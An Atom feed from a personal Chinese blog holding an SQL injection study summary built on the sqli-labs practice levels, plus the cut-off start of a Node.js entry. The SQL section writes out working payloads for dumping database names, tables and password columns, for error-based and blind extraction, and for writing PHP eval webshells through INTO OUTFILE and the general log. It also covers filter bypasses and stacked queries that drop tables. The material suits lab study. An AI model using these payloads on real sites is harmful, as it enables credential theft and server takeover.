<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://kite-007.github.io</id>
    <title>Fr</title>
    <updated>2021-05-17T11:47:27.091Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://kite-007.github.io"/>
    <link rel="self" href="https://kite-007.github.io/atom.xml"/>
    <subtitle>意志坚定，持之以恒</subtitle>
    <logo>https://kite-007.github.io/images/avatar.png</logo>
    <icon>https://kite-007.github.io/favicon.ico</icon>
    <rights>All rights reserved 2021, Fr</rights>
    <entry>
        <title type="html"><![CDATA[# SQL注入总结]]></title>
        <id>https://kite-007.github.io/sql-zhu-ru-zong-jie/</id>
        <link href="https://kite-007.github.io/sql-zhu-ru-zong-jie/">
        </link>
        <updated>2021-05-17T11:40:52.000Z</updated>
        <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
<li><a href="#sql%E6%B3%A8%E5%85%A5%E5%A4%8D%E4%B9%A0%E6%80%BB%E7%BB%93">SQL注入复习总结</a>
<ul>
<li><a href="#%E5%8E%9F%E7%90%86%E6%88%90%E5%9B%A0">原理成因</a></li>
<li><a href="#%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B">注入过程</a></li>
<li><a href="#%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95">注入方法</a></li>
<li><a href="#%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95">攻击手法</a>
<ul>
<li><a href="#1-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5">1. 联合查询注入</a></li>
<li><a href="#2-%E9%94%99%E8%AF%AF%E5%9B%9E%E6%98%BE%E6%B3%A8%E5%85%A5">2. 错误回显注入</a></li>
<li><a href="#3-shell%E9%93%BE%E6%8E%A5">3. shell链接</a></li>
<li><a href="#4-%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E7%9A%84%E7%9B%B2%E6%B3%A8">4. 基于布尔的盲注</a></li>
<li><a href="#5-%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8">5. 基于时间的盲注</a></li>
<li><a href="#6-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5">6. 二次注入</a></li>
<li><a href="#7-%E8%BF%87%E6%BB%A4%E6%B3%A8%E5%85%A5">7. 过滤注入</a></li>
<li><a href="#8-%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%A4%E5%B1%82%E6%9E%B6%E6%9E%84">8. 服务器两层架构</a></li>
<li><a href="#9-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5">9. 宽字节注入</a></li>
<li><a href="#10-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5">10. 堆叠注入</a></li>
</ul>
</li>
<li><a href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%81%A2%E5%A4%8D">数据库恢复</a></li>
</ul>
</li>
</ul>
</p>
<h1 id="sql注入复习总结">SQL注入复习总结</h1>
<h2 id="原理成因">原理成因</h2>
<pre><code>	SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句。
	一般网页的应用数据和后台数据库中的数据进行交互时会采用SQL。而SQL注入是将Web页面的原URL、表单域或数据包输入的参数，修改拼接成SQL语句，传递给Web服务器，进而传给数据库服务器以执行数据库命令。
	SQL注入攻击是通过操作输入来修改SQL语句，用以达到执行代码对WEB服务器进行攻击的方法。简单的说就是在post/getweb表单、输入域名或页面请求的查询字符串中插入SQL命令，最终使web服务器执行恶意命令的过程。另外，在网站开发过程中，开发人员使用动态字符串构造SQL语句，用来创建所需的应用，这种情况下SQL语句在程序的执行过程中被动态的构造使用，可以根据不同的条件产生不同的SQL语句，比如需要根据不同的要求来查询数据库中的字段。这样的开发过程其实为SQL注入攻击留下了很多的可乘之机。
</code></pre>
<h2 id="注入过程">注入过程</h2>
<pre><code>	第一步：SQL注入点探测。探测SQL注入点是关键的一步，通过适当的分析应用程序，可以判断什么地方存在SQL注入点。通常只要带有输入提交的动态网页，并且动态网页访问数据库，就可能存在SQL注入漏洞。如果程序员信息安全意识不强，采用动态构造SQL语句访问数据库，并且对用户的输入未进行有效性验证，则存在SQL注入漏洞的可能性很大。一般通过页面的报错信息来确定是否存在SQL注入漏洞。
	第二步：收集后台数据库信息。不同数据库的注入方法、函数都不尽相同，因此在注入之前，我们先要判断一下数据库的类型。判断数据库类型的方法很多，可以输入特殊字符，如单引号，让程序返回错误信息，我们根据错误信息提示进行判断；还可以使用特定函数来判断，比如输入“1 and version（）&gt;0”，程序返回正常，说明version（）函数被数据库识别并执行，而version（）函数是MySQL特有的函数，因此可以推断后台数据库为MySQL。
	第三步：猜解用户名和密码。数据库中的表和字段命名一般都是有规律的。通过构造特殊SQL语句在数据库中依次猜解出表名、字段名、字段数、用户名和密码。
	第四步：查找Web后台管理入口。WEB后台管理通常不对普通用户开放，要找到后台管理的登录网址，可以利用Web目录扫描工具（如：wwwscan、AWVS）快速搜索到可能的登录地址，然后逐一尝试，便可以找到后台管理平台的登录网址。 
	第五步：入侵和破坏。一般后台管理具有较高权限和较多的功能，使用前面已破译的用户名、密码成功登录后台管理平台后，就可以任意进行破坏，比如上传木马、篡改网页、修改和窃取信息等，还可以进一步提权，入侵Web服务器和数据库服务器。
</code></pre>
<h2 id="注入方法">注入方法</h2>
<pre><code>	根据用户以及页面所需要的输入的数据的类型判断，将SQL注入方式分为两大类：数字型注入，字符型注入。
	这两者组大的区别就在于：数字型不需要单引号闭合，而字符串类型一般要使用单引号来闭合。
</code></pre>
<h2 id="攻击手法">攻击手法</h2>
<h3 id="1-联合查询注入">1. 联合查询注入</h3>
<ol>
<li>
<p>前置知识点<br>
使用联合查询进行注入的前提是我们要进行注入的页面必须有显示位。所谓联合查询注入即是使用union合并两个或多个SELECT语句的结果集，所以两个及以上的select必须有相同列、且各列的数据类型也都相同。联合查询注入可在链接最后添加order by 9基于随意数字的注入，根据页面的返回结果来判断站点中的字段数目。<br>
sqli-labs对应关卡：less1-4</p>
</li>
<li>
<p>基本流程：判断注入类型，查看回显字段数，查看回显位置，库表列信息</p>
</li>
</ol>
<p>判断注入类型：字符型注入，还是数字型注入。</p>
<pre><code class="language-sql">通常所使用的查询sql语句：
	数字型：select * from users where id =1
	字符型：select * from users where id ='1'

数字型可以通过以下方式判断：
	select * from users where id =1 and 1=1；
	没有语法显示错误且，返回正常
	
	select * from users where id =1 and 1=2;
	没有语法错误且，返回错误
	
	如果上述没有返回错误，则为字符型
	
字符型可以通过以下方式判断：
	select * from users where id='1' and '1'='1'
	语法正确，逻辑判断正确，返回正确
	
	select * from users where id='1' and '1'='2'
	语法正确，逻辑判断错误，返回错误
	
	如果上述两条语句都判断错误，则为数字型
</code></pre>
<p>查看回显字段列数：看有几个地方回显数据</p>
<pre><code class="language-sql">查看回显字段列数所使用的sql语句：
	select * from users where id ='1' order by 3 --+(注释掉后面的语句)
	出现Unknown则回显字段数不正确。

	order by X 给第X列数据进行排序
</code></pre>
<p>查看回显位置：在回显列数的基础上看回显位置</p>
<pre><code class="language-sql">回显列数的基础上看回显位置:
	将id修改为不存在的值，联合查询所需要的，进行回显位的判断
	select * from users where id ='-1' ' union select 1,2,3 --+
</code></pre>
<p>查看库列表信息：在回显的位置上查看信息</p>
<pre><code class="language-sql">数据库信息：
	select * from users where id ='-1' union select 1,2,group_concat(schema_name)from information_schema.schemata--+
	
	group_concat() //将数据用一行显示出来
	schema //英文意为架构，这里表示是数据库对象集合
	information_schema //信息数据库，其中保存着关于MySQL服务器所维护的所有其他数据库的信息
	schema_name //数据库名称
	information_schema.schemata //获取所有数据库信息
	group_concat() //将数据用一行显示出来
	
数据表信息：
	select * from users where id ='-1' union select 1,2,group_concat(table_name)from information_schema.tables where table_schema='security'--+
	'security'这里如果有遇到被转义的情况，则使用十六进制
	
数据列信息：
	select * from users where id ='-1' union select 1,2,group_concat(column_name)from information_schema.columns where table_name='users'--+
	'users'这里如果有遇到被转义的情况，则使用十六进制
	
账号密码信息：
	select * from users where id ='-1' union select 1,2,group_concat(concat_ws('~',username,password))from security.users--+
	concat_ws(‘C’,A,B) //用”C“将“A”与“B”隔开,C不为NULL
</code></pre>
<h3 id="2-错误回显注入">2. 错误回显注入</h3>
<ol>
<li>
<p>前置知识点<br>
此方法是在页面没有显示位，但是echo mysql_error();函数输出了错误信息的时候方能使用。优点是注入速度快，缺点是语句较为复杂，而且只能用limit依次进行猜解。总体来说，报错注入其实是一种公式化的注入方法，主要用于在页面中没有显示位，但是用echo mysql_error();输出了错误信息时使用。<br>
less5，6</p>
</li>
<li>
<p>基本流程：判断注入类型，库表列信息</p>
</li>
</ol>
<pre><code class="language-sql">判断注入类型，与上述相同.

数据库信息：
	select * from users where id ='1' and updatexml(1,concat(0x7e,database(),0x7e),1)%23/
	
	concat() //将多个字符串连接成一个字符串,返回结果为连接参数产生的字符串,如果有任何一个参数为null,则返回值为null。
	updatexml()函数：UPDATEXML (XML_document, XPath_string, new_value);
		第一个参数：XML_document是String格式，为XML文档对象的名称，
		第二个参数：XPath_string (Xpath格式的字符串) ，
		第三个参数：new_value，String格式，替换查找到的符合条件的数据
		作用：改变文档中符合条件的节点的值,改变XML_document中符合XPATH_string的值。
		而我们的注入语句为：updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1),其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出,ERROR 1105 (HY000): XPATH syntax error: ‘:root@localhost’
		updatexml()这个函数最多只能爆32位字符,要爆的数据超过了这个位数,所使用limit 0,1来实现单个数据查询。
		xpath语法格式总结：http://www.uoften.com/article/125607.htm

数据表信息：
	select * from users where id ='1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23

数据列信息：
	select * from users where id ='1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),1)%23

账号信息：
	select * from users where id ='1' and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)%23

密码信息：
	select * from users where id ='1' and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1)%23
</code></pre>
<pre><code>1、floor()函数
原理：
利用rand()函数与group()函数的相互冲突，floor()是向下取整函数，floor(9.99)=9.0
语法结构：

username=admin' and (select 1 from (select count(*), concat(floor(rand(0)*2),0x23,你想获取的数据的sql语句)x from information_schema.tables group by x )a) and '1' = '1

https://www.zhihu.com/question/21031129

2、extractvalue()函数
语法结构：

extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)))

concat中添加要查询的语句

3、updatexml()函数
语法结构：

and 1=(updatexml(1,concat(0x3a,(select user())),1))

4、exp()函数
语法结构：

and EXP(~(SELECT * from(select user())a))

5、归类
GeometryCollection()

id = 1 AND GeometryCollection((select * from (select * from(select user())a)b))

polygon()
id =1 AND polygon((select * from(select * from(select user())a)b))

multipoint()
id = 1 AND multipoint((select * from(select * from(select user())a)b))

multilinestring()
id = 1 AND multilinestring((select * from(select * from(select user())a)b))

linestring()
id = 1 AND LINESTRING((select * from(select * from(select user())a)b))
</code></pre>
<h3 id="3-shell链接">3. shell链接</h3>
<ol>
<li>
<p>前置知识点<br>
在所有常用的关系数据库管理系统中均包含内置的向服务器文件系统写文件的功能，通过这些内置的功能，我们可以将自己的webshell写目录或文件进去。<br>
写入条件<br>
1.MYSQL用secure_file_priv这个配置项来完成对数据导入导出的限制，<br>
如果secure_file_priv=NULL，MYSQL服务会禁止导入和导出操作。<br>
如果secure_file_priv=/tmp/，MYSQL服务只能在/tmp/目录下导入和导出<br>
如果secure_file_priv=&quot;&quot; ，MYSQL服务导入和导出不做限制<br>
通过命令查看secure-file-priv的当前值，确定是否允许导入导出以及导出文件路径<br>
2.MYSQL中root用户拥有所有权限，但写入webshell并不需要一定是root用户权限，比如数据库用户只要拥有FILE权限就可以执行select into outfile操作<br>
3.当secure_file_priv文件导出路径与web目录路径重叠，写入webshell才可以被访问到<br>
简单点说就是<br>
1.select into outfile方法可用（允许导出文件）<br>
2.我们需要知道网站所在的绝对路径<br>
3.我们要有足够的权限</p>
<p>less7</p>
</li>
<li>
<p>基本流程：注入类型，回显字段列数，网站绝对目录，写入shell，连接shell</p>
</li>
</ol>
<pre><code class="language-sql">判断注入类型
回显字段数
网站绝对目录
	select * from users where id='-1' union select 1,2,@@datadir --+
	这里这个方法需要网站有报错信息，但是第七关没有，可以暂时先在第1-6中进行

写入shell
	select * from users where id='-1' union select 1,2,'&lt;?php @eval($_POST[&quot;pass&quot;]);?&gt;' into outfile'D:\\phpStudy\\PHPTutorial\\MySQL\\data\\shell.php'--+
	
连接shell
</code></pre>
<ol start="3">
<li>写入shell方式</li>
</ol>
<pre><code class="language-shell">	union select 后写入
		最常见的写入方式，union select 后跟 into outfile 语句
		http://1.1.1.1/x/x.php?id=1 union select 1,2,3,4,’&lt;?php phpinfo() ?&gt;’ into outfile ‘C:/wamp64/www/work/webshell.php’
		http://1.1.1.1/x/x.php?id=1 union select 1,2,3,4,’&lt;?php phpinfo() ?&gt;’ into dumpfile ‘C:/wamp64/www/work/webshell.php’
		PS: 在windows下，位置的分隔符为 /（斜杠）。
</code></pre>
<pre><code class="language-shell">	lines terminated by 写入
		http://1.1.1.1/x/x.php?id=1 into outfile ‘C:/wamp64/www/work/webshell.php’ lines terminated by ‘&lt;?php phpinfo() ?&gt;’;
		http://1.1.1.1/x/x.php?id=1 limit 1 into outfile ‘C:/wamp64/www/work/webshell.php’ lines terminated by ‘&lt;?php phpinfo() ?&gt;’;
		注入原理
			通过select语句查询的内容写入文件，也就是 1 into outfile 'C:/wamp64/www/work/webshell.php' 这样写的原因，然后利用 lines terminated by 语句拼接webshell的内容。lines terminated by 可以理解为 以每行终止的位置添加 xx 内容。
		?id=1 INTO OUTFILE '物理路径' lines terminated by  （一句话hex编码）#
</code></pre>
<pre><code class="language-shell">	lines starting by 写入
		http://1.1.1.1/x/x.php?id=1 into outfile ‘C:/wamp64/www/work/webshell.php’ lines starting by ‘&lt;?php phpinfo() ?&gt;’;
		http://1.1.1.1/x/x.php?id=1 limit 1 into outfile ‘C:/wamp64/www/work/webshell.php’ lines starting by ‘&lt;?php phpinfo() ?&gt;’;
		注入原理
			利用 lines starting by 语句拼接webshell的内容。lines starting by 可以理解为 以每行开始的位置添加 xx 内容。
		?id=1 INTO OUTFILE '物理路径' lines starting by    （一句话hex编码）#
</code></pre>
<pre><code class="language-shell">	fields terminated by 写入
		http://1.1.1.1/x/x.php?id=1 into outfile ‘C:/wamp64/www/work/webshell.php’ fields terminated by ‘&lt;?php phpinfo() ?&gt;’;
		http://1.1.1.1/x/x.php?id=1 limit 1 into outfile ‘C:/wamp64/www/work/webshell.php’ fields terminated by ‘&lt;?php phpinfo() ?&gt;’;
		注入原理
			利用 fields terminated by 语句拼接webshell的内容。fields terminated by 可以理解为 以每个字段的位置添加 xx 内容。
		?id=1 INTO OUTFILE '物理路径' fields terminated by （一句话hex编码）#
</code></pre>
<pre><code class="language-shell">	COLUMNS terminated by 写入
		http://1.1.1.1/x/x.php?id=1 into outfile ‘C:/wamp64/www/work/webshell.php’ COLUMNS terminated by ‘&lt;?php phpinfo() ?&gt;’;
		http://1.1.1.1/x/x.php?id=1 limit 1 into outfile ‘C:/wamp64/www/work/webshell.php’ COLUMNS terminated by ‘&lt;?php phpinfo() ?&gt;’;
		注入原理
			利用 fields terminated by 语句拼接webshell的内容。fields terminated by 可以理解为 以每个字段的位置添加 xx 内容。
		?id=1 INTO OUTFILE '物理路径' columns terminated by （一句话hex编码）#
</code></pre>
<pre><code class="language-shell">	log写入
	新版本的MySQL设置了导出文件的路径，很难在获取Webshell过程中去修改配置文件，无法通过使用select into outfile来写入一句话。这时，我们可以通过修改MySQL的log文件来获取Webshell。具体权限要求：数据库用户需具备Super和File服务器权限、获取物理路径。

show variables like '%general%';
查看配置

set global general_log = on;
开启
general log
模式

set global general_log_file = 'E:/study/WWW/evil.php';
设置日志目录为
shell
地址

select '&lt;?php eval($_GET[g]);?&gt;'
写入
shell

set global general_log=off;
关闭
general log
模式
</code></pre>
<h3 id="4-基于布尔的盲注">4. 基于布尔的盲注</h3>
<ol>
<li>
<p>前置知识点<br>
因为web的页面返回值都是True或者False，所以布尔盲注就是注入后根据页面返回值来得到数据库信息的一种办法。</p>
</li>
<li>
<p>基本流程：注入类型，回显字段列数，猜解信息长度，猜解信息字符</p>
</li>
</ol>
<pre><code class="language-sql">注入类型
回显字段数
猜解库长度
	select * from users where id='1' and length(database())=8 --+
	
猜解库字符
	select * from users where id='1' and ascii(left((select database()),1))=0x73 --+  
	或
	select * from users where id='1' and ascii(substr((select database()),$1$,1)) = 115--+
	# substr：第一个变量位表示当前使用的数据库的第几个字符，第二个1表示从左往右显示几个字符
	# ascii:将得到的字符转化为十进制数，如果不使用ascii函数则可以使用十六进制代替
	
猜解所有库字符
	select * from users where id='1' and ascii(substr((select schema_name from information_schema.schemata limit $0$,1),$1$,1)) = 105 --+
	# limit:第一个变量位表示该数据库连接中的从0开始显示第几个数据库，第二个1表示显示出几个数据库
	
猜解所有表字符
	select * from users where id='1' and ascii(substr((select table_name from information_schema.tables where table_schema='security' limit $0$,1),$1$,1)) = 101 --+
	
猜解所有列字符
	select * from users where id='1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit $0$,1),$1$,1))=117 --+
	
猜解信息
	select * from users where id='1' and ascii(substr((select username from security.users limit 0,1),1,1)) &gt;10 --+
	select * from users where id='1' and ascii(substr((select passowrd from security.users limit 0,1),1,1)) &gt;10 --+
</code></pre>
<h3 id="5-基于时间的盲注">5. 基于时间的盲注</h3>
<ol>
<li>
<p>前置知识点<br>
当布尔型注入没有结果（页面显示正常）的时候，我们很难判断注入的代码是否被执行，也可以说到底这个注入点存不存在？这个时候布尔型注入就无法发挥自己的作用了。基于时间的盲注便应运而生，所谓基于时间的盲注，就是我们根据web页面相应的时间差来判断该页面是否存在SQL注入点。</p>
</li>
<li>
<p>基本流程：注入类型，回显字段列数，猜解信息长度，猜解信息字符</p>
</li>
</ol>
<pre><code class="language-sql">注入类型
回显字段数
猜解库长度
	select * from users where id='1' and if((length(database())=8),1,sleep(60)) --+
	# if(condition,A,B)，如果condition为真，则执行A，否则执行B
	# sleep(A)，如果执行该函数，则会睡眠A秒再返回结果
	
猜解库字符
	select * from users where id='1' and if(ascii(substr((select database()),$1$,1))&gt;$1$,1,sleep(5)) --+

猜解所有库字符
	select * from users where id='1' and if(ascii(substr((select schema_name from information_schema.schemata limit $0$,1),$1$,1))&gt;$1$,1,sleep(60)) --+
	
猜解所有表字符
	select * from users where id='1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit $0$,1),$1$,1))&gt;$1$,1,sleep(60)) --+
	
猜解所有列字符
	select * from users where id='1' and if(ascii(substr((select column_name from information_schema.columns where table_name='users' limit $0$,1),$1$,1))&gt;$1$,1,sleep(60)) --+
	
猜解信息
	select * from users where id='1' and if(ascii(substr((select username from security.users limit $0$,1),$1$,1))&gt;$1$,1,sleep(60)) --+
	select * from users where id='1' and if(ascii(substr((select password from security.users limit $0$,1),$1$,1))&gt;$1$,1,sleep(60)) --+
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://gitee.com/qu-xiaolei001/pic/raw/master/img/20201027223949447.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="2"><img src="https://gitee.com/qu-xiaolei001/pic/raw/master/img/20201027223956307.png" alt="" loading="lazy"></figure>
<h3 id="6-二次注入">6. 二次注入</h3>
<ol>
<li>前置知识点<br>
二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</li>
</ol>
<p>二次注入，可以概括为以下两步:</p>
<pre><code>第一步：插入恶意数据
进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。

第二步：引用恶意数据
开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。
</code></pre>
<ol start="2">
<li>基本流程：插入恶意数据，引用恶意数据</li>
</ol>
<pre><code class="language-sql">less-24
	插入恶意数据：创建admin'# 的帐号
	引用恶意数据：等录之后进行修改密码，所修改的就是正常用户admin的密码
</code></pre>
<h3 id="7-过滤注入">7. 过滤注入</h3>
<p>过滤绕过方式：<br>
1. 注释符<br>
2. 大小写<br>
3. 内敛注释<br>
4. 双关键字<br>
5. 编码<br>
6. 空格<br>
7. 等号<br>
8. 大于小于</p>
<p>过滤时,首先判断是一次性的还是非一次性的：</p>
<p>若一次性，且只将过滤字符换成了空字符：<br>
则双写绕过：or=oorr、and=anandd</p>
<p>若非一次性，则考虑一些变形：<br>
大小写变形——or=Or=oR=OR<br>
利用运算符——or=||、and=&amp;&amp;<br>
URL编码——#=%23，Hex编码——~=0x7e<br>
添加注释——/or/</p>
<h3 id="8-服务器两层架构">8. 服务器两层架构</h3>
<ol>
<li>
<p>前置知识点<br>
服务器端有两个部分：第一部分为tomcat为引擎的jsp型服务器，第二部分为apache为引擎的php服务器，真正提供web服务的是php服务器。工作流程为：client访问服务器，能直接访问到tomcat服务器，然后tomcat服务器再向apache服务器请求数据。数据返回路径则相反。（从此看出来我们修改第一个值是无用的，主要是第二个值）<br>
https://www.cnblogs.com/lcamry/p/5762961.html：<br>
<img src="D:%5CPicGo%5Cimage%5CQQ%E6%88%AA%E5%9B%BE20210504172124.png" alt="" loading="lazy"></p>
</li>
<li>
<p>基本流程</p>
</li>
</ol>
<pre><code class="language-sql">index.jsp?id=1&amp;id=1//正确界面
index.jsp?id=1'&amp;id=1//提示WAF防御
index.jsp?id=1&amp;id=1'//报错发现注入点
index.jsp?id=1&amp;id=1'–+//无异常
index.jsp?id=1&amp;id=1' order by X(X=1,2,3,4) --+//列信息有三列
index.jsp?id=1&amp;id=-3' union select 1,2,3 --+//联合注入
</code></pre>
<h3 id="9-宽字节注入">9. 宽字节注入</h3>
<ol>
<li>
<p>前置知识点<br>
https://blog.csdn.net/weixin_39934520/article/details/105968747</p>
<ul>
<li>
<p>涉及到的基本概念</p>
<ul>
<li>
<p>字符，字符集<br>
字符（Character）是各种文字和符号的总称，包括各国家文字、标点符号、图形符号、数字等。字符集（Character set）是多个字符的集合，字符集种类较多，每个字符集包含的字符个数不同，常见字符集名称：ASCII字符集、GB2312字符集、BIG5字符集、 GB18030字符集、Unicode字符集等。计算机要准确的处理各种字符集文字，就需要进行字符编码，以便计算机能够识别和存储各种文字。中文文字数目大，而且还分为简体中文和繁体中文两种不同书写规则的文字，而计算机最初是按英语单字节字符设计的，因此，对中文字符进行编码，是中文信息交流的技术基础。</p>
</li>
<li>
<p>UTF8<br>
由于ASCII表示的字符只有128个，因此网络世界的规范是使用UNICODE编码，但是用ASCII表示的字符使用UNICODE并不高效。因此出现了中间格式字符集，被称为通用转换格式，及UTF(Universal Transformation Format)。<br>
UTF-8（8位元，Universal Character Set/Unicode Transformation Format）是针对Unicode的一种可变长度字符编码。它可以用来表示Unicode标准中的任何字符，而且其编码中的第一个字节仍与ASCII相容，使得原来处理ASCII字符的软件无须或只进行少部分修改后，便可继续使用。因此，它逐渐成为电子邮件、网页及其他存储或传送文字的应用中，优先采用的编码。<br>
<img src="https://gitee.com/qu-xiaolei001/pic/raw/master/img/QQ%E6%88%AA%E5%9B%BE20210503201457.png" alt="QQ截图20210503201457" loading="lazy"></p>
</li>
<li>
<p>宽字节<br>
宽字节就是两个以上的字节，宽字节注入产生的原因就是各种字符编码的不当操作，使得攻击者可以通过宽字节编码绕过SQL注入防御。<br>
通常来说，一个gbk编码汉字，占用2个字节。一个utf-8编码的汉字，占用3个字节。</p>
</li>
</ul>
</li>
<li>
<p>宽字节注入</p>
<ul>
<li>在使用PHP连接MySQL的时候，当设置&quot;set character_set_client=gbk&quot;时会导致一个编码转换的问题。</li>
<li>例子： id=1’ 处理 1’ 进行编码1%5c%27 带入sql后 id=’ and XXXX 此时无法完成注入<br>
id=1%df’ 处理 1%df’ 进行编码1%df%5c%27 带入sql后 id=1運’ and XXXX 此时存在宽字节注入，这里的意思是：id=1‘，进行判断，但是存在转义过滤，将字符‘前面加上\进行转义掉，并且进行了编码处理，无法完成注入，但是如果提前输入%df（空格编码），还是先将字符‘前面加上\进行转义掉，并且进行了编码处理，但是这时编码后形成了1%df%5c%27，%df%5c相当于汉字運，就可以带入sql进行注入。</li>
<li><img src="https://gitee.com/qu-xiaolei001/pic/raw/master/img/QQ%E6%88%AA%E5%9B%BE20210503202646.png" alt="" loading="lazy"></li>
<li>解码网站：http://www.mytju.com/classcode/tools/urldecode_gb2312.asp</li>
</ul>
</li>
</ul>
</li>
<li>
<p>基本流程：查询id（发现存在转义），将转义字符拼接成为宽字节，正常注入</p>
</li>
</ol>
<pre><code class="language-sql">查询id（发现存在转义）
	select * from users where id='1' --+
	返回被转义后的数据
	Hint: The Query String you input is escaped as : 1\' --
    '
转义字符拼接成为宽字节
	select * from users where id='1%df' 出现报错
    select * from users where id='1%df' --+ 正常回显
    或者
    知道%5c所代表的是\，这时提前加上%5c，就相当于已经被转义了
    select * from users where id='1%5c'
    select * from users where id='1%aa%5c' --+
    
正常注入
	select * from users where id='1%df' (注入语句) --+
	
过滤函数，最上面的博客也有涉及比较详细
	addslashes()：https://www.w3school.com.cn/php/func_string_addslashes.asp
	mysql_real_escape_string（）：https://www.w3school.com.cn/php/func_mysql_real_escape_string.asp
	
</code></pre>
<h3 id="10-堆叠注入">10. 堆叠注入</h3>
<ol>
<li>
<p>前置知识点<br>
堆叠注入，多条SQL语句一起执行。<br>
在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。<br>
堆叠注入也有局限性，并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序，同时版本不同也可能导致一些问题。<br>
虽然前面提到了堆叠查询可以执行任意的sql语句，但是这种注入方式并不是十分的完美的。在我们的web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。<br>
因此，在读取数据时，我们建议使用union（联合）注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。</p>
</li>
<li>
<p>基本流程：https://www.cnblogs.com/lcamry/p/5762905.html</p>
</li>
</ol>
<pre><code class="language-sql">新建数据表
	select * from users where id=1;create table test like users;
	
删除数据表
	select * from users where id=1;drop table test;
	
修改数据表
	select * from users where id=1;insert into users(id,username,password) values('100','new','new');
	
查询数据表
	select * from users where id=1;select 1,2,3;
	
加载文件
	select * from users where id=1;select load_file('c:/tmpupbbn.php');
</code></pre>
<h2 id="数据库恢复">数据库恢复</h2>
<p>数据库恢复的三种方式<br>
数据库可能因为硬件或软件（或两者同时）的故障变得不可用，不同的故障情况需要不同的恢复操作。我们必须决定最适合业务环境的恢复方法。在数据库中恢复有3种类型或方法，即应急（crash）恢复、版本（version）恢复和前滚（rool forward）恢复。</p>
<p>应急恢复<br>
应急恢复用于防止数据库处于不一致或不可用状态。数据库执行的事务（也称工作单元）可能被意外中断，若在作为工作单位一部分的所有更改完成和提交之前发生故障，则该数据库就会处于不一致和不可用的状态。这时，需要将该数据库转化为一致和可用的状态。<br>
为此，需要回滚未完成的事务，并完成当发生崩溃时仍在内存中的已提交事务。如在COMMIT语句之前发生了电源故障，则在下一次重新启动并再次访问该数据库时，需要回滚到执行COMMMIT语句前的状态。回滚语句的顺序与最初执行时的顺序相反。</p>
<p>版本恢复<br>
版本恢复指的是使用备份操作期间创建的映象来复原数据库的先前版本。这种恢复是通过使用一个以前建立的数据库备份恢复出一个完整的数据库。一个数据库的备份允许你把数据库恢复至和这个数据库在备份时完全一样的状态。而从备份建立后到日志文件中最后记录的所有工作事务单位将全部丢失。</p>
<p>前滚恢复<br>
这种恢复技术是版本恢复的一个扩展，使用完整的数据库备份和日志相结合，可以使一个数据库或者被选择的表空间恢复到某个特定时间点。如果从备份时刻起到发生故障时的所有日志文件都可以获得的话，则可以恢复到日志上涵盖到的任意时间点。前滚恢复需要在配置中被明确激活才能生效。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[# nodejs]]></title>
        <id>https://kite-007.github.io/nodejs/</id>
        <link href="https://kite-007.github.io/nodejs/">
        </link>
        <updated>2021-05-17T11:39:10.000Z</updated>
        <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
<li><a href="#nodejs">nodejs</a>
<ul>
<li><a href="#%E4%B8%80-%E8%BF%90%E8%A1%8C%E8%84%9A%E6%9C%AC">一、运行脚本</a></li>
<li><a href="#%E4%BA%8C-%E5%88%9B%E5%BB%BA%E5%BA%94%E7%94%A8">二、创建应用</a>
<ul>
<li><a href="#1-%E5%BC%95%E5%85%A5%E6%A8%A1%E5%9D%97">1. 引入模块</a></li>
<li><a href="#2-%E5%88%9B%E5%BB%BA%E6%9C%8D%E5%8A%A1%E5%99%A8">2. 创建服务器</a></li>
</ul>
</li>
